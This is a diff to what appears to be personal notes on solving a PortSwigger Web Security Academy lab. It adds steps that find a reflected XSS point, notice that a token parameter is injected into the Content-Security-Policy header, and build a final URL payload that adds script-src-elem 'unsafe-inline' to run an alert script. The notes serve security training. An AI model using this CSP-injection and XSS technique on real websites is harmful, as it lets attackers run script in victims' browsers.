@@ -915,13 +915,16 @@ https://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem
 1. find injection location:
 
 
+```
+GET /search=<img src=1 onerror=alert(1)>HTTP/1.1
+```
 
+response: img reflected but script didnt fire-up
 
-
-
+2. observe CSP has a token value in the report-uri parameter. check if injection reflects:
 
 ```
-ET /?token=test HTTP/1.1
+GET /?token=test HTTP/1.1
 ```
 
 response:
@@ -930,12 +933,17 @@ HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
 Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=test
 ```
+we can inject arbitary values to the CSP:
 
-2. adjust CSP bypass:
+3. adjust CSP bypass:
 
-https://0a32002b034ca0a2c0db0e8600880038.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+search=<script>alert()</script>
+token=;script-src-elem 'unsafe-inline'
 
+**final payload:**
+https://0a32002b034ca0a2c0db0e8600880038.web-security-academy.net/?search=%3Cscript%3Ealert%28%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
 
+# Lab solved
 
 
 
